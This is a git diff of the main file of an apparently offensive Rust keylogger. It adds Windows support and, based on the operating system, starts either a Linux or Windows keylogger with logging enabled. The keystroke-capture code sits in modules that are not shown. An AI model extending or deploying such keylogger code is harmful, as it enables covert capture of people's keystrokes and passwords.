@@ -1,18 +1,25 @@
 use std::env::consts;
 
-mod common;
 mod linux;
+mod windows;
 
-use common::Common;
-use linux::keylogger::Keylogger as LinuxKeyLog;
+use linux::keylogger::Keylogger as LinuxKl;
+use windows::keylogger::Keylogger as WindowsKl;
+
+pub trait Common {
+    fn start_logging(&self);
+}
 
 fn main() {
     let os = consts::FAMILY;
-    let kl: Box<dyn Common>;
 
-    kl = if os.contains("windows") { panic!("sznioooo") } else { Box::new( LinuxKeyLog { } ) };
+    let keylogger: Box<dyn Common> = if os.contains("windows") {
+        Box::new(WindowsKl::new()) }
+    else if os.contains("unix") {
+        Box::new(LinuxKl { })
+    } else {
+        panic!()
+    };
 
-    let kbds = kl.find_keyboard();
-    println!("{:?}", kbds);
-    // kl.start_logging();
+    keylogger.start_logging();
 }
